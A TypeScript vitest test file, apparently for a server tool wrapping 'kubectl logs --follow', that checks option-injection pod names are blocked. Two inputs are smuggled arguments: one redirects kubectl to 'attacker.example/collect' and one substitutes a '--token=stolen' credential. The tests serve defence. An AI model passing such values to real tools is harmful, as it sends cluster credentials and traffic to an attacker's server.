/**
 * Following logs keeps a child process alive and streams its output. The
 * caller-supplied pod name is still a bare word on that command line.
 */
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { ServerHandle, expectBlocked, startServer } from "../helpers";

let server: ServerHandle;

beforeAll(async () => {
  server = await startServer();
});

afterAll(async () => {
  await server.close();
});

beforeEach(() => {
  server.reset();
});

describe("following logs refuses caller values that would be options", () => {
  it("does not follow a pod whose name selects another API server", async () => {
    const outcome = await server.callTool("kubectl_logs", {
      resourceType: "pod",
      name: "--server=https://attacker.example/collect",
      namespace: "default",
      follow: true,
    });

    await expectBlocked(server, outcome);
  });

  it("does not follow a pod whose name substitutes credentials", async () => {
    const outcome = await server.callTool("kubectl_logs", {
      resourceType: "pod",
      name: "--token=stolen",
      namespace: "default",
      follow: true,
    });

    await expectBlocked(server, outcome);
  });
});
